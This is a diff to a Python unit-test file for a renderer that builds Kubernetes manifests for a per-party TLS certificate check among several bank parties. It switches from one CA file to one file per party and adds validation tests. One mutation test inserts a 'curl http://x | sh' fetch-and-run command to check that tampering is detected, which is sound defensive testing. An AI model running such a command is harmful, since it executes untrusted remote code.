@@ -22,10 +22,14 @@ ALIASES = ["10.200.12.122=bank2,endorser-2", "10.200.16.61=issuer,endorser-1", "
 class Base(unittest.TestCase):
     def setUp(self):
         self.tmp = tempfile.TemporaryDirectory(); self.addCleanup(self.tmp.cleanup)
-        self.ca = f"{self.tmp.name}/ca.pem"; open(self.ca, "w").write(CA)
+        self.cas = {}
+        for p in ("bi", "bank-a", "bank-b", "bank-c"):
+            self.cas[p] = f"{self.tmp.name}/ca-{p}.pem"
+            with open(self.cas[p], "w") as f:
+                f.write(CA)
 
     def docs(self, party="bank-a", **kw):
-        a = dict(image=IMG, name="p1", checks=CHECKS, allow=ALLOW, aliases=ALIASES, cacert=self.ca); a.update(kw)
+        a = dict(image=IMG, name="p1", checks=CHECKS, allow=ALLOW, aliases=ALIASES, cacert=[f"{p}={f}" for p, f in self.cas.items()]); a.update(kw)
         return list(yaml.safe_load_all(render.render_p2psan(party, **a)))
 
 
@@ -39,7 +43,8 @@ class Render(Base):
         self.assertEqual([d["kind"] for d in ds], ["ConfigMap", "NetworkPolicy", "Job"])
         cm, np, job = split(ds)
         t = job["spec"]["template"]; c = t["spec"]["containers"][0]
-        self.assertEqual(cm["data"], {"ca.pem": CA})
+        self.assertEqual(cm["data"], {f"ca-{p}.pem": CA for p in ("bank-a", "bi", "bank-b", "bank-c")} | {})   # one root per party, in the order the checks name them
+        self.assertEqual(sorted(cm["data"]), ["ca-bank-a.pem", "ca-bank-b.pem", "ca-bank-c.pem", "ca-bi.pem"])
         self.assertEqual(c["image"], IMG); self.assertEqual(c["command"][:2], ["bash", "-c"]); self.assertEqual(c["command"][3:], ["p2psan", *CHECKS])
         self.assertEqual(t["metadata"]["labels"]["rd/egress-locked"], "true")
         self.assertIs(t["spec"]["automountServiceAccountToken"], False)
@@ -55,19 +60,23 @@ class Render(Base):
         self.assertNotIn("53", text); self.assertNotIn("kube-dns", text)   # no DNS: every host is a hostAlias or a Service ClusterIP alias
 
     def test_the_script_is_pinned(self):
-        self.assertEqual(hashlib.sha256(render.P2PSAN_SCRIPT.encode()).hexdigest(), "1279907c9edceed598ef343cd62ef2b5526796de51129fa3237e6d103e250522")
+        self.assertEqual(hashlib.sha256(render.P2PSAN_SCRIPT.encode()).hexdigest(), "b23892a00de2acb266f5c0d428980aa3cb606adcec9284c13684631d98d6a067")
 
     def test_inputs_are_validated(self):
         for kw in (dict(checks=["bad"]), dict(checks=["bi/issuer@issuer"]), dict(checks=["bi/issuer@issuer:99999"]), dict(checks=["bi/iss uer@issuer:5101"]), dict(checks=[]), dict(name="UPPER"),
                    dict(image="postgres:17"), dict(aliases=["not-an-alias"]), dict(aliases=["999.1.1.1=a"]), dict(allow=["dns", "pod=a:1"] + ["pod=x:2"] * 0 + ["bogus"])):
             with self.subTest(kw=kw), self.assertRaises(SystemExit):
                 self.docs(**kw)
-        open(self.ca, "w").write(CA + "-----BEGIN PRIVATE KEY-----\nxx\n-----END PRIVATE KEY-----\n")
+        open(self.cas["bi"], "w").write(CA + "-----BEGIN PRIVATE KEY-----\nxx\n-----END PRIVATE KEY-----\n")
         with self.assertRaises(SystemExit):
             self.docs()
-        open(self.ca, "w").write("not a certificate")
+        open(self.cas["bi"], "w").write("not a certificate")
         with self.assertRaises(SystemExit):
             self.docs()
+        open(self.cas["bi"], "w").write(CA)
+        for bad in ([f"bi={self.cas['bi']}"], [f"{p}={f}" for p, f in self.cas.items()] + [f"bi={self.cas['bi']}"], ["bi"]):   # a party missing, a party twice, not PARTY=FILE
+            with self.subTest(cacert=bad), self.assertRaises(SystemExit):
+                self.docs(cacert=bad)
 
 
 class Mutants(Base):
@@ -95,7 +104,7 @@ class Mutants(Base):
         self.assertTrue(self.mutate(lambda cm, np, j, c: j["spec"]["template"]["spec"].__setitem__("automountServiceAccountToken", True)))
 
     def test_private_key_in_the_ca_configmap(self):
-        self.assertTrue(self.mutate(lambda cm, np, j, c: cm["data"].__setitem__("ca.pem", CA + "-----BEGIN PRIVATE KEY-----")))
+        self.assertTrue(self.mutate(lambda cm, np, j, c: cm["data"].__setitem__("ca-bi.pem", CA + "-----BEGIN PRIVATE KEY-----")))
 
     def test_script_changed(self):
         self.assertTrue(self.mutate(lambda cm, np, j, c: c["command"].__setitem__(2, "curl http://x | sh")))
@@ -120,7 +129,7 @@ class ScriptRuns(unittest.TestCase):
         srv = subprocess.Popen(["openssl", "s_server", "-accept", str(port), "-cert", f"{d}/s.pem", "-key", f"{d}/s.key", "-quiet"], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         try:
             time.sleep(0.7)
-            script = render.P2PSAN_SCRIPT.replace("/ca/ca.pem", cafile)
+            script = render.P2PSAN_SCRIPT.replace("/ca/ca-$party.pem", cafile)
             return subprocess.run(["bash", "-c", script, "p2psan", f"{party}/{node}@127.0.0.1:{port}"], capture_output=True, text=True, timeout=40).stdout
         finally:
             srv.kill(); srv.wait()
@@ -150,7 +159,7 @@ class ScriptRuns(unittest.TestCase):
         self.assertEqual((r.returncode, r.stdout.strip()), (3, "NO_OPENSSL in this image"))
 
     def test_no_listener_prints_a_clear_line(self):
-        out = subprocess.run(["bash", "-c", render.P2PSAN_SCRIPT.replace("/ca/ca.pem", "/dev/null"), "p2psan", "bi/issuer@127.0.0.1:18799"], capture_output=True, text=True, timeout=40).stdout
+        out = subprocess.run(["bash", "-c", render.P2PSAN_SCRIPT.replace("/ca/ca-$party.pem", "/dev/null"), "p2psan", "bi/issuer@127.0.0.1:18799"], capture_output=True, text=True, timeout=40).stdout
         self.assertIn("bi issuer: no certificate presented from 127.0.0.1:18799", out)
 
 
